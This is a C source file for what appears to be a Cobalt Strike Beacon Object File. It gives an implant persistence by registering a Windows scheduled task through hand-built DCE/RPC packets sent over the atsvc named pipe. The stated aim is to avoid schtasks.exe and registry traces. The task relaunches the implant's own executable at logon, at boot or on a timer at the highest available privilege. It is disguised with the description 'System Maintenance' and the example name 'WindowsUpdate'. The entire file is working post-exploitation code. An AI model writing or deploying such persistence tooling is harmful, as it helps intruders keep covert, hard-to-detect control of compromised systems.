/*
 * schtask_persist_rpc.c - Scheduled Task via direct DCE/RPC to Task Scheduler.
 *
 * Sends a raw DCE/RPC Bind + Request over the \pipe\atsvc named pipe,
 * calling SchRpcRegisterTask (opnum 1) directly.
 * No COM, no schtasks.exe, no registry writes — pure RPC.
 *
 * Args (single string via Beacon Data API):
 *   "<task_name> <schedule>"
 *
 * Build:
 *   x86_64-w64-mingw32-gcc -c schtask_persist_rpc.c -o schtask_persist_rpc.o
 */

#include <windows.h>
#include "beacon.h"

/* ── DLL Imports ── */
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateFileA(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$WriteFile(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$ReadFile(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$CloseHandle(HANDLE);
DECLSPEC_IMPORT DWORD  WINAPI KERNEL32$GetModuleFileNameA(HMODULE, LPSTR, DWORD);
DECLSPEC_IMPORT void   WINAPI KERNEL32$GetLocalTime(LPSYSTEMTIME);
DECLSPEC_IMPORT int    WINAPI KERNEL32$MultiByteToWideChar(UINT, DWORD, LPCCH, int, LPWSTR, int);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$SetNamedPipeHandleState(HANDLE, LPDWORD, LPDWORD, LPDWORD);
DECLSPEC_IMPORT DWORD  WINAPI KERNEL32$GetLastError(void);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$WaitNamedPipeA(LPCSTR, DWORD);

/* ── Helpers ── */
static void bof_memset(void* d, int v, unsigned long long n) {
    unsigned char* p = (unsigned char*)d; while (n--) *p++ = (unsigned char)v;
}
static void bof_memcpy(void* d, const void* s, unsigned long long n) {
    unsigned char* pd = (unsigned char*)d;
    const unsigned char* ps = (const unsigned char*)s;
    while (n--) *pd++ = *ps++;
}
static int bof_strlen(const char* s) { int n = 0; while (s[n]) n++; return n; }
static int bof_wcslen(const WCHAR* s) { int n = 0; while (s[n]) n++; return n; }
static char bof_upper(char c) { return (c >= 'a' && c <= 'z') ? c - 32 : c; }
static int bof_strcmp(const char* a, const char* b) {
    while (*a && *b && *a == *b) { a++; b++; }
    return (unsigned char)*a - (unsigned char)*b;
}

static int sa(char* dst, int pos, const char* src) {
    int len = bof_strlen(src); bof_memcpy(dst + pos, src, len); return pos + len;
}

static int bof_itoa(int val, char* buf) {
    if (val <= 0) { buf[0] = '0'; return 1; }
    char tmp[12]; int i = 0;
    while (val > 0) { tmp[i++] = '0' + val % 10; val /= 10; }
    for (int j = 0; j < i; j++) buf[j] = tmp[i - 1 - j];
    return i;
}

static int d2(char* b, int v) { b[0] = '0' + v / 10; b[1] = '0' + v % 10; return 2; }

static int parse_mo(const char* s) {
    for (const char* p = s; *p; p++) {
        if ((p[0] == '/' || p[0] == '-') &&
            bof_upper(p[1]) == 'M' && bof_upper(p[2]) == 'O' &&
            (p[3] == ' ' || p[3] == ':')) {
            p += 4; while (*p == ' ') p++;
            int v = 0;
            while (*p >= '0' && *p <= '9') { v = v * 10 + (*p - '0'); p++; }
            return v > 0 ? v : 1;
        }
    }
    return 1;
}

static void parse_st(const char* s, int* hh, int* mm) {
    *hh = 0; *mm = 0;
    for (const char* p = s; *p; p++) {
        if ((p[0] == '/' || p[0] == '-') &&
            bof_upper(p[1]) == 'S' && bof_upper(p[2]) == 'T' &&
            (p[3] == ' ' || p[3] == ':')) {
            p += 4; while (*p == ' ') p++;
            if (p[0] && p[1] && p[2] == ':' && p[3] && p[4]) {
                *hh = (p[0] - '0') * 10 + (p[1] - '0');
                *mm = (p[3] - '0') * 10 + (p[4] - '0');
            }
            return;
        }
    }
}

static void report_hr(const char* msg, unsigned long hr) {
    char buf[256]; int p = 0, ml = bof_strlen(msg);
    bof_memcpy(buf, msg, ml); p += ml;
    buf[p++] = ' '; buf[p++] = '0'; buf[p++] = 'x';
    for (int i = 7; i >= 0; i--) {
        int nib = (hr >> (i * 4)) & 0xF;
        buf[p++] = nib < 10 ? '0' + nib : 'A' + nib - 10;
    }
    buf[p++] = '\n';
    BeaconOutput(CALLBACK_ERROR, buf, p);
}

/* ── Write LE values into buffer ── */
static void w16(unsigned char* p, unsigned short v) { p[0] = v & 0xFF; p[1] = (v >> 8) & 0xFF; }
static void w32(unsigned char* p, unsigned long v) { p[0] = v & 0xFF; p[1] = (v >> 8) & 0xFF; p[2] = (v >> 16) & 0xFF; p[3] = (v >> 24) & 0xFF; }
static unsigned long r32(const unsigned char* p) { return p[0] | (p[1] << 8) | (p[2] << 16) | (p[3] << 24); }

/* ── NDR: encode unique pointer to conformant varying WCHAR string, returns bytes written ── */
static int ndr_unique_wstr(unsigned char* buf, const WCHAR* s) {
    int pos = 0;
    if (!s) {
        w32(buf, 0); /* NULL referent */
        return 4;
    }
    int wlen = bof_wcslen(s) + 1; /* include null */
    w32(buf + pos, 0x00020000 + pos); pos += 4; /* referent ID (non-zero) */
    w32(buf + pos, wlen); pos += 4;   /* MaxCount */
    w32(buf + pos, 0);   pos += 4;   /* Offset */
    w32(buf + pos, wlen); pos += 4;   /* ActualCount */
    bof_memcpy(buf + pos, s, wlen * 2); pos += wlen * 2;
    /* pad to 4-byte boundary */
    while (pos & 3) buf[pos++] = 0;
    return pos;
}

/* ── NDR: encode ref conformant varying WCHAR string (no referent ID) ── */
static int ndr_ref_wstr(unsigned char* buf, const WCHAR* s) {
    int pos = 0;
    int wlen = bof_wcslen(s) + 1;
    w32(buf + pos, wlen); pos += 4;   /* MaxCount */
    w32(buf + pos, 0);   pos += 4;   /* Offset */
    w32(buf + pos, wlen); pos += 4;   /* ActualCount */
    bof_memcpy(buf + pos, s, wlen * 2); pos += wlen * 2;
    while (pos & 3) buf[pos++] = 0;
    return pos;
}

/* ═══════════════════════════════════════════════════════════
   DCE/RPC Bind PDU for ITaskSchedulerService
   Interface: {86D35949-83C9-4044-B424-DB363231FD0C} v1.0
   Transfer: NDR {8A885D04-1CEB-11C9-9FE8-08002B104860} v2.0
   ═══════════════════════════════════════════════════════════ */
static const unsigned char RPC_BIND_PDU[72] = {
    /* Common header (16 bytes) */
    0x05, 0x00,                         /* version 5.0 */
    0x0B,                               /* ptype = bind (11) */
    0x03,                               /* flags: PFC_FIRST_FRAG | PFC_LAST_FRAG */
    0x10, 0x00, 0x00, 0x00,             /* drep: LE, ASCII, IEEE */
    0x48, 0x00,                         /* frag_length: 72 */
    0x00, 0x00,                         /* auth_length: 0 */
    0x01, 0x00, 0x00, 0x00,             /* call_id: 1 */
    /* Bind-specific (12 bytes) */
    0xB8, 0x10,                         /* max_xmit_frag: 4280 */
    0xB8, 0x10,                         /* max_recv_frag: 4280 */
    0x00, 0x00, 0x00, 0x00,             /* assoc_group: 0 */
    0x01, 0x00, 0x00, 0x00,             /* p_context_elem count: 1 */
    /* Context element (44 bytes) */
    0x00, 0x00,                         /* context_id: 0 */
    0x01, 0x00,                         /* num_transfer_syntaxes: 1 */
    /* Abstract syntax: ITaskSchedulerService UUID */
    0x49, 0x59, 0xD3, 0x86,
    0xC9, 0x83,
    0x44, 0x40,
    0xB4, 0x24, 0xDB, 0x36, 0x32, 0x31, 0xFD, 0x0C,
    0x01, 0x00, 0x00, 0x00,             /* version 1.0 */
    /* Transfer syntax: NDR 2.0 */
    0x04, 0x5D, 0x88, 0x8A,
    0xEB, 0x1C,
    0xC9, 0x11,
    0x9F, 0xE8, 0x08, 0x00, 0x2B, 0x10, 0x48, 0x60,
    0x02, 0x00, 0x00, 0x00              /* version 2.0 */
};

/* ═══════════════════════════════════════════════════════════ */

void go(char* args, int alen)
{
    /* ── 1. Parse args ── */
    char* input = NULL;
    int input_len = 0;
    if (args && alen >= 2) {
        datap parser;
        BeaconDataParse(&parser, args, alen);
        input = BeaconDataExtract(&parser, &input_len);
    }
    if (!input || input_len <= 0) {
        BeaconOutput(CALLBACK_ERROR,
            "Usage: <task_name> <schedule>\nExample: WindowsUpdate ONLOGON\n", 61);
        return;
    }

    char raw[512];
    if (input_len >= (int)sizeof(raw)) input_len = sizeof(raw) - 1;
    bof_memcpy(raw, input, input_len);
    raw[input_len] = '\0';

    char* sp = NULL;
    for (int i = 0; i < input_len; i++) {
        if (raw[i] == ' ') { sp = raw + i; break; }
    }
    if (!sp) {
        BeaconOutput(CALLBACK_ERROR,
            "Usage: <task_name> <schedule>\nExample: WindowsUpdate ONLOGON\n", 61);
        return;
    }
    *sp = '\0';
    char* task_name = raw;
    int tname_len = bof_strlen(task_name);
    char* schedule = sp + 1;
    while (*schedule == ' ') schedule++;
    if (!*schedule) {
        BeaconOutput(CALLBACK_ERROR, "Missing schedule\n", 17);
        return;
    }

    char stype[16]; int si = 0;
    while (schedule[si] && schedule[si] != ' ' && si < 15) {
        stype[si] = bof_upper(schedule[si]); si++;
    }
    stype[si] = '\0';
    char* params = schedule + si;
    while (*params == ' ') params++;

    /* ── 2. Get exe path ── */
    char exe_path[512];
    DWORD elen = KERNEL32$GetModuleFileNameA(NULL, exe_path, sizeof(exe_path));
    if (elen == 0 || elen >= sizeof(exe_path)) {
        BeaconOutput(CALLBACK_ERROR, "GetModuleFileName failed\n", 24);
        return;
    }
    exe_path[elen] = '\0';

    /* ── 3. Get time ── */
    SYSTEMTIME st;
    KERNEL32$GetLocalTime(&st);

    /* ── 4. Build task XML ── */
    char xml[4096];
    int xp = 0;

    xp = sa(xml, xp, "<?xml version=\"1.0\" encoding=\"UTF-16\"?>\r\n");
    xp = sa(xml, xp, "<Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\">\r\n");
    xp = sa(xml, xp, "  <RegistrationInfo>\r\n    <Description>System Maintenance</Description>\r\n");
    xp = sa(xml, xp, "    <Date>");
    xp += bof_itoa(st.wYear, xml + xp); xml[xp++] = '-';
    xp += d2(xml + xp, st.wMonth); xml[xp++] = '-';
    xp += d2(xml + xp, st.wDay); xml[xp++] = 'T';
    xp += d2(xml + xp, st.wHour); xml[xp++] = ':';
    xp += d2(xml + xp, st.wMinute); xml[xp++] = ':';
    xp += d2(xml + xp, st.wSecond);
    xp = sa(xml, xp, "</Date>\r\n  </RegistrationInfo>\r\n  <Triggers>\r\n");

    if (bof_strcmp(stype, "ONLOGON") == 0) {
        xp = sa(xml, xp, "    <LogonTrigger><Enabled>true</Enabled></LogonTrigger>\r\n");
    } else if (bof_strcmp(stype, "ONSTART") == 0) {
        xp = sa(xml, xp, "    <BootTrigger><Enabled>true</Enabled></BootTrigger>\r\n");
    } else if (bof_strcmp(stype, "MINUTE") == 0 || bof_strcmp(stype, "HOURLY") == 0 ||
               bof_strcmp(stype, "DAILY") == 0) {
        int mo = parse_mo(params);
        xp = sa(xml, xp, "    <TimeTrigger>\r\n      <StartBoundary>");
        xp += bof_itoa(st.wYear, xml + xp); xml[xp++] = '-';
        xp += d2(xml + xp, st.wMonth); xml[xp++] = '-';
        xp += d2(xml + xp, st.wDay); xml[xp++] = 'T';
        xp += d2(xml + xp, st.wHour); xml[xp++] = ':';
        xp += d2(xml + xp, st.wMinute);
        xp = sa(xml, xp, ":00</StartBoundary>\r\n      <Enabled>true</Enabled>\r\n");
        xp = sa(xml, xp, "      <Repetition><Interval>P");
        if (bof_strcmp(stype, "DAILY") == 0) {
            xp += bof_itoa(mo, xml + xp); xml[xp++] = 'D';
        } else {
            xml[xp++] = 'T';
            xp += bof_itoa(mo, xml + xp);
            xml[xp++] = (bof_strcmp(stype, "HOURLY") == 0) ? 'H' : 'M';
        }
        xp = sa(xml, xp, "</Interval><Duration>P10000D</Duration>");
        xp = sa(xml, xp, "<StopAtDurationEnd>false</StopAtDurationEnd></Repetition>\r\n");
        xp = sa(xml, xp, "    </TimeTrigger>\r\n");
    } else if (bof_strcmp(stype, "ONCE") == 0) {
        int hh = 0, mm = 0; parse_st(params, &hh, &mm);
        xp = sa(xml, xp, "    <TimeTrigger>\r\n      <StartBoundary>");
        xp += bof_itoa(st.wYear, xml + xp); xml[xp++] = '-';
        xp += d2(xml + xp, st.wMonth); xml[xp++] = '-';
        xp += d2(xml + xp, st.wDay); xml[xp++] = 'T';
        xp += d2(xml + xp, hh); xml[xp++] = ':';
        xp += d2(xml + xp, mm);
        xp = sa(xml, xp, ":00</StartBoundary>\r\n      <Enabled>true</Enabled>\r\n    </TimeTrigger>\r\n");
    } else {
        BeaconOutput(CALLBACK_ERROR, "Unknown schedule. Use: ONLOGON ONSTART MINUTE HOURLY DAILY ONCE\n", 64);
        return;
    }

    xp = sa(xml, xp, "  </Triggers>\r\n  <Principals>\r\n    <Principal id=\"Author\">\r\n");
    xp = sa(xml, xp, "      <RunLevel>HighestAvailable</RunLevel>\r\n    </Principal>\r\n  </Principals>\r\n");
    xp = sa(xml, xp, "  <Settings>\r\n    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>\r\n");
    xp = sa(xml, xp, "    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>\r\n");
    xp = sa(xml, xp, "    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>\r\n");
    xp = sa(xml, xp, "    <AllowHardTerminate>true</AllowHardTerminate>\r\n");
    xp = sa(xml, xp, "    <StartWhenAvailable>true</StartWhenAvailable>\r\n");
    xp = sa(xml, xp, "    <Enabled>true</Enabled>\r\n    <Hidden>false</Hidden>\r\n");
    xp = sa(xml, xp, "    <RunOnlyIfIdle>false</RunOnlyIfIdle>\r\n    <WakeToRun>false</WakeToRun>\r\n");
    xp = sa(xml, xp, "    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>\r\n    <Priority>7</Priority>\r\n  </Settings>\r\n");
    xp = sa(xml, xp, "  <Actions Context=\"Author\">\r\n    <Exec>\r\n      <Command>");
    bof_memcpy(xml + xp, exe_path, elen); xp += elen;
    xp = sa(xml, xp, "</Command>\r\n    </Exec>\r\n  </Actions>\r\n</Task>\r\n");
    xml[xp] = '\0';

    /* ── 5. Convert strings to WCHAR ── */
    /* Task path: \<task_name> */
    char path_a[520];
    path_a[0] = '\\';
    bof_memcpy(path_a + 1, task_name, tname_len);
    path_a[1 + tname_len] = '\0';

    WCHAR wpath[260];
    int wpathlen = KERNEL32$MultiByteToWideChar(0, 0, path_a, -1, wpath, 260);
    if (wpathlen <= 0) {
        BeaconOutput(CALLBACK_ERROR, "Path WCHAR conversion failed\n", 29);
        return;
    }

    WCHAR wxml[4096];
    int wxmllen = KERNEL32$MultiByteToWideChar(0, 0, xml, -1, wxml, 4096);
    if (wxmllen <= 0) {
        BeaconOutput(CALLBACK_ERROR, "XML WCHAR conversion failed\n", 28);
        return;
    }

    /* ── 6. Report ── */
    {
        char info[512]; int ip = 0;
        ip = sa(info, ip, "[RPC] SchRpcRegisterTask → \\pipe\\atsvc | Task: ");
        bof_memcpy(info + ip, task_name, tname_len); ip += tname_len;
        ip = sa(info, ip, " | Schedule: ");
        int slen = bof_strlen(schedule);
        bof_memcpy(info + ip, schedule, slen); ip += slen;
        info[ip++] = '\n';
        BeaconOutput(CALLBACK_OUTPUT, info, ip);
    }

    /* ── 7. Open named pipe ── */
    const char* pipePath = "\\\\.\\pipe\\atsvc";

    /* Wait for pipe if busy */
    KERNEL32$WaitNamedPipeA(pipePath, 5000);

    HANDLE hPipe = KERNEL32$CreateFileA(pipePath,
        0xC0000000L /* GENERIC_READ | GENERIC_WRITE */,
        0, NULL,
        3 /* OPEN_EXISTING */,
        0, NULL);
    if (hPipe == INVALID_HANDLE_VALUE) {
        DWORD err = KERNEL32$GetLastError();
        report_hr("Open \\pipe\\atsvc failed, error:", err);
        return;
    }

    /* Switch pipe to message-read mode */
    DWORD pipeMode = 0x00000002; /* PIPE_READMODE_MESSAGE */
    KERNEL32$SetNamedPipeHandleState(hPipe, &pipeMode, NULL, NULL);

    /* ── 8. Send DCE/RPC Bind ── */
    DWORD written, bytesRead;
    if (!KERNEL32$WriteFile(hPipe, RPC_BIND_PDU, sizeof(RPC_BIND_PDU), &written, NULL) ||
        written != sizeof(RPC_BIND_PDU)) {
        BeaconOutput(CALLBACK_ERROR, "Bind write failed\n", 18);
        KERNEL32$CloseHandle(hPipe);
        return;
    }

    /* ── 9. Read Bind Ack ── */
    unsigned char bindAck[512];
    bof_memset(bindAck, 0, sizeof(bindAck));
    if (!KERNEL32$ReadFile(hPipe, bindAck, sizeof(bindAck), &bytesRead, NULL) || bytesRead < 24) {
        BeaconOutput(CALLBACK_ERROR, "Bind ack read failed\n", 21);
        KERNEL32$CloseHandle(hPipe);
        return;
    }

    /* Verify bind ack: ptype should be 12 (bind_ack) */
    if (bindAck[2] != 0x0C) {
        if (bindAck[2] == 0x0D) {
            BeaconOutput(CALLBACK_ERROR, "Bind NAK — interface not supported\n", 35);
        } else {
            report_hr("Unexpected bind response type:", bindAck[2]);
        }
        KERNEL32$CloseHandle(hPipe);
        return;
    }

    /* ── 10. Build NDR stub data for SchRpcRegisterTask (opnum 1) ──
     *
     * Parameters (in order):
     *   [in, string, unique]  wchar_t *path     → NDR unique pointer + conformant string
     *   [in, string]          wchar_t *xml      → NDR ref conformant string (no referent ID)
     *   [in]                  DWORD   flags      → 6 (TASK_CREATE_OR_UPDATE)
     *   [in, string, unique]  wchar_t *sddl     → NULL (referent ID = 0)
     *   [in]                  DWORD   logonType  → 3 (TASK_LOGON_INTERACTIVE_TOKEN)
     *   [in, range(0,10)]     DWORD   cCreds    → 0
     *   [in, unique]          TASK_USER_CRED *pCreds → NULL
     */
    unsigned char stub[16384];
    int sp2 = 0;

    /* param 1: path [unique string] */
    sp2 += ndr_unique_wstr(stub + sp2, wpath);

    /* param 2: xml [ref string] */
    sp2 += ndr_ref_wstr(stub + sp2, wxml);

    /* param 3: flags = TASK_CREATE_OR_UPDATE (6) */
    w32(stub + sp2, 6); sp2 += 4;

    /* param 4: sddl = NULL */
    w32(stub + sp2, 0); sp2 += 4;

    /* param 5: logonType = TASK_LOGON_INTERACTIVE_TOKEN (3) */
    w32(stub + sp2, 3); sp2 += 4;

    /* param 6: cCreds = 0 */
    w32(stub + sp2, 0); sp2 += 4;

    /* param 7: pCreds = NULL */
    w32(stub + sp2, 0); sp2 += 4;

    /* ── 11. Build Request PDU ── */
    int reqHdrSize = 24;
    int totalReq = reqHdrSize + sp2;
    unsigned char* reqPdu = stub - reqHdrSize; /* we'll use a separate buffer */

    /* Use a contiguous buffer */
    unsigned char* pdu = stub; /* reuse — shift stub data right */
    /* Actually, let's build a new buffer */
    unsigned char reqBuf[16384 + 24];
    /* Request header */
    reqBuf[0] = 0x05; reqBuf[1] = 0x00; /* version 5.0 */
    reqBuf[2] = 0x00;                    /* ptype = request */
    reqBuf[3] = 0x03;                    /* flags: first|last */
    reqBuf[4] = 0x10; reqBuf[5] = 0x00; reqBuf[6] = 0x00; reqBuf[7] = 0x00; /* drep */
    w16(reqBuf + 8, (unsigned short)totalReq);  /* frag_length */
    w16(reqBuf + 10, 0);                        /* auth_length */
    w32(reqBuf + 12, 2);                        /* call_id: 2 */
    w32(reqBuf + 16, sp2);                      /* alloc_hint = stub size */
    w16(reqBuf + 20, 0);                        /* context_id: 0 */
    w16(reqBuf + 22, 1);                        /* opnum: 1 (SchRpcRegisterTask) */
    /* Copy stub data */
    bof_memcpy(reqBuf + 24, stub, sp2);

    /* ── 12. Send Request ── */
    if (!KERNEL32$WriteFile(hPipe, reqBuf, totalReq, &written, NULL) ||
        (int)written != totalReq) {
        BeaconOutput(CALLBACK_ERROR, "Request write failed\n", 20);
        KERNEL32$CloseHandle(hPipe);
        return;
    }

    /* ── 13. Read Response ── */
    unsigned char resp[4096];
    bof_memset(resp, 0, sizeof(resp));
    if (!KERNEL32$ReadFile(hPipe, resp, sizeof(resp), &bytesRead, NULL) || bytesRead < 28) {
        BeaconOutput(CALLBACK_ERROR, "Response read failed\n", 20);
        KERNEL32$CloseHandle(hPipe);
        return;
    }

    KERNEL32$CloseHandle(hPipe);

    /* Verify response: ptype should be 2 (response) */
    if (resp[2] != 0x02) {
        if (resp[2] == 0x03) {
            /* Fault response — error code at offset 24 */
            unsigned long faultCode = r32(resp + 24);
            report_hr("RPC fault:", faultCode);
        } else {
            report_hr("Unexpected response type:", resp[2]);
        }
        return;
    }

    /* ── 14. Parse HRESULT from response stub ──
     *
     * Response stub layout for SchRpcRegisterTask:
     *   [out, string] wchar_t **pActualPath  → unique pointer + string
     *   [out] TASK_XML_ERROR_INFO **pErrorInfo → unique pointer + data
     *   HRESULT return value              → 4 bytes at end
     *
     * The HRESULT is the LAST 4 bytes of the stub data.
     */
    int stubOffset = 24; /* response header size */
    int stubLen = (int)bytesRead - stubOffset;
    if (stubLen < 4) {
        BeaconOutput(CALLBACK_ERROR, "Response stub too short\n", 24);
        return;
    }

    /* HRESULT is the last 4 bytes of stub data */
    unsigned long hr = r32(resp + bytesRead - 4);

    if (hr == 0) {
        char ok[256]; int op = 0;
        op = sa(ok, op, "[RPC] Scheduled task created: ");
        bof_memcpy(ok + op, task_name, tname_len); op += tname_len;
        ok[op++] = '\n';
        BeaconOutput(CALLBACK_OUTPUT, ok, op);
    } else {
        report_hr("[RPC] SchRpcRegisterTask failed:", hr);
    }
}
